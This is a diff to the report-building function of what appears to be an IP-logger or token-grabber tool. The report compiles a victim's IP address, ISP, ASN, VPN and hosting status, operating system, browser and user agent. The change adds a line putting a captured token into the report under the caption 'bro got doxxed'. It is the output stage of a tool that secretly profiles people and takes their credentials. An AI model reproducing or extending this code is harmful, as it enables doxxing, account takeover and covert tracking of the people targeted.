@@ -150,7 +150,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **Endpoint:** `{endpoint}`
             
-**IP Info🛜:**
+**|IP Info|:**
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
@@ -163,10 +163,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**PC Info💻:**
+**PC Info 💻:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
-
+> **bro got doxxed :** `{token}`
 **User Agent:**
 ```
 {useragent}
